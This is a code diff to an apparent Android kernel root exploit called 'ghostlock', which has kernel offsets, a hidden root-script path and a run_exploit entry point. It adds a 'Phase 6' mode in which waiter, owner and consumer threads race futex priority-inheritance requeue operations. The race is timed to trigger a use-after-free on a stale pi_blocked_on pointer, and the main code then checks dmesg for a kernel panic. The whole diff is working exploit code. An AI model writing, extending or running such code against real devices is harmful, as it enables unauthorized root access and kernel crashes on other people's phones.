@@ -21,6 +21,151 @@ const struct kernel_offsets *active_offsets = NULL;
 static char g_home_dir[256] = "/data/local/tmp";
 static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";
 
+
+/* Phase 6: dangling pi_blocked_on UAF test mode.
+ * Set GHOSTLOCK_PHASE6=1 to use the new timing:
+ *   owner releases → waiter returns → consumer locks
+ * This triggers the UAF on waiter_task->pi_blocked_on. */
+static int g_phase6_mode = 0;
+
+/* Phase 6 globals */
+static atomic_int p6_waiter_ready;
+static atomic_int p6_waiter_waiting;
+static atomic_int p6_waiter_acquired;
+static atomic_int p6_owner_started;
+static atomic_int p6_owner_released;
+static atomic_int p6_consumer_done;
+static atomic_int p6_owner_stop;
+static atomic_int p6_waiter_tid_val;
+
+static void *p6_waiter_thread(void *arg) {
+  (void)arg;
+  disable_rseq_for_thread();
+  int tid = (int)syscall(SYS_gettid);
+  atomic_store(&p6_waiter_tid_val, tid);
+
+  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
+    pr_error("p6-waiter: lock chain errno=%d\n", errno);
+  atomic_store(&p6_waiter_ready, 1);
+
+  while (!atomic_load(&p6_owner_started)) usleep(1000);
+
+  pr_info("p6-waiter: boosting priority nice=-10 (tid=%d)\n", tid);
+  sched_setattr_tid(tid, -10);
+
+  struct timespec timeout;
+  clock_gettime(CLOCK_MONOTONIC, &timeout);
+  timeout.tv_sec += 5;
+  atomic_store(&p6_waiter_waiting, 1);
+  pr_info("p6-waiter: FUTEX_WAIT_REQUEUE_PI (blocking)\n");
+  long ret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+                       &f_pi_target, 0);
+  pr_info("p6-waiter: returned %ld errno=%d\n", ret, errno);
+
+  /* After requeue + owner release: we acquire f_pi_target and return */
+  atomic_store(&p6_waiter_acquired, 1);
+  pr_info("p6-waiter: acquired f_pi_target, returning to userspace\n");
+  pr_info("p6-waiter: pi_blocked_on is STALE (dangling pointer!)\n");
+
+  while (!atomic_load(&p6_consumer_done)) usleep(1000);
+
+  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  return NULL;
+}
+
+static void *p6_owner_thread(void *arg) {
+  (void)arg;
+  disable_rseq_for_thread();
+
+  long lock_ret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  if (lock_ret != 0) pr_error("p6-owner: lock errno=%d\n", errno);
+  atomic_store(&p6_owner_started, 1);
+
+  while (!atomic_load(&p6_waiter_ready)) usleep(1000);
+  while (!atomic_load(&p6_waiter_waiting)) usleep(1000);
+  usleep(50000);
+
+  /* KEY: release BEFORE consumer locks → waiter acquires → returns */
+  pr_info("p6-owner: releasing f_pi_target (waiter will acquire)\n");
+  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  atomic_store(&p6_owner_released, 1);
+
+  while (!atomic_load(&p6_consumer_done)) usleep(1000);
+
+  /* Re-acquire to clean up */
+  futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  return NULL;
+}
+
+static void *p6_consumer_thread(void *arg) {
+  (void)arg;
+  disable_rseq_for_thread();
+  pin_to_core(CONSUMER_CORE);
+
+  int tid = (int)syscall(SYS_gettid);
+  pr_info("p6-consumer: boosting nice=-20 (tid=%d)\n", tid);
+  sched_setattr_tid(tid, -20);
+
+  /* Wait for owner release + waiter acquire + return */
+  pr_info("p6-consumer: waiting for waiter to return\n");
+  while (!atomic_load(&p6_owner_released)) usleep(1000);
+  usleep(5000); /* let waiter_task return to userspace, stack freed */
+
+  pr_info("p6-consumer: waiter should have returned, stack freed\n");
+  pr_info("p6-consumer: FUTEX_LOCK_PI → chain walk → read stale pi_blocked_on\n");
+  atomic_store(&p6_consumer_done, 1);
+
+  struct timespec ft = {.tv_sec = 0, .tv_nsec = 200000000};
+  errno = 0;
+  long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
+  int saved_errno = errno;
+  pr_info("p6-consumer: FUTEX_LOCK_PI returned %ld errno=%d\n", fret, saved_errno);
+
+  if (fret == 0) {
+    pr_info("p6-consumer: got lock, releasing\n");
+    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  }
+  return NULL;
+}
+
+static int run_phase6(void) {
+  pr_info("=== Phase 6: dangling pi_blocked_on UAF ===\n");
+  pr_info("Timing: owner releases -> waiter returns -> consumer locks\n");
+
+  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
+  atomic_store(&p6_waiter_ready, 0);
+  atomic_store(&p6_waiter_waiting, 0);
+  atomic_store(&p6_waiter_acquired, 0);
+  atomic_store(&p6_owner_started, 0);
+  atomic_store(&p6_owner_released, 0);
+  atomic_store(&p6_consumer_done, 0);
+  atomic_store(&p6_owner_stop, 0);
+
+  pthread_t waiter, owner, consumer;
+  pthread_create(&waiter, NULL, p6_waiter_thread, NULL);
+  pthread_create(&owner, NULL, p6_owner_thread, NULL);
+  pthread_create(&consumer, NULL, p6_consumer_thread, NULL);
+
+  while (!atomic_load(&p6_waiter_ready) || !atomic_load(&p6_owner_started))
+    usleep(1000);
+  usleep(50000);
+
+  pr_info("p6-main: FUTEX_CMP_REQUEUE_PI\n");
+  long r = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1,
+                     (void *)1, &f_pi_target, 0);
+  pr_info("p6-main: requeue returned %ld errno=%d\n", r, errno);
+
+  usleep(3000000);
+  pr_info("p6-main: done — check dmesg for panic/BUG\n");
+
+  atomic_store(&p6_owner_stop, 1);
+  pthread_join(waiter, NULL);
+  pthread_join(owner, NULL);
+  pthread_join(consumer, NULL);
+  return 0;
+}
+
 /* MTK loads the kernel at the DRAM base (text_offset=0), Qualcomm via the
  * bootloader; the same uname -r can serve both families, so detect at
  * runtime.  W1 has no root and /proc is SELinux-blocked: read SoC
@@ -937,6 +1082,11 @@ static int verify_leaf_dir_stage(void *context) {
 
 int run_exploit(int argc, char **argv) {
   (void)argc; (void)argv;
+  /* Phase 6 mode: set GHOSTLOCK_PHASE6=1 */
+  if (getenv("GHOSTLOCK_PHASE6") && getenv("GHOSTLOCK_PHASE6")[0] == '1') {
+    g_phase6_mode = 1;
+    return run_phase6();
+  }
   disable_rseq_for_thread();
   set_unbuffer();
   signal(SIGPIPE, SIG_IGN);
